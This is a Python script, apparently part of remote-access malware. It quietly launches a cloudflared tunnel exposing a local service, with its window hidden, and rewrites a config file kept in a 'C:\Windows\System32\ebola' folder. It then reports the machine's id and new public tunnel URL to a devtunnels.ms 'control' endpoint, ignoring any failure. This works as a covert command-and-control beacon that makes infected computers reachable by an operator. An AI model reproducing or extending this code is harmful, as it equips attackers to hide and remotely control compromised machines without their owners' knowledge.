import re
import subprocess
import sys
import requests

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

def run_background():
    process = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:4101'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd="C:\Program Files (x86)\cloudflared", startupinfo=si)
    
    pattern = r'https?:\/\/[^\s]+.trycloudflare\.com'
    while True:
        line = process.stdout.readline().decode('utf-8')

        if not line:
            break
        
        match = re.search(pattern, line)
        
        if match:
            return match.group()


if __name__ == '__main__':
    new_url = run_background()
    info: str
    _id: str
    _url: str
    
    with open(r'C:\Windows\System32\ebola\info.txt', 'r') as f:
        info = f.read()
        
        id_pattern = r'id:(.+)'
        _id = re.search(id_pattern, info).group(1)
        _id = _id.lower().replace(' ', '-')
        
        url_pattern = r'url:(.+)'
        _url = re.search(url_pattern, info).group(1)
    
    with open(r'C:\Windows\System32\ebola\info.txt', 'w') as fr:
        fr.write(f'{info.replace(_url, new_url)}')

    try:
        res = requests.post(f'https://wxtdf382-4100.uks1.devtunnels.ms/url/control/{_id}', json={"url": f"{new_url}"}, timeout=5)
    except Exception as err:
        pass
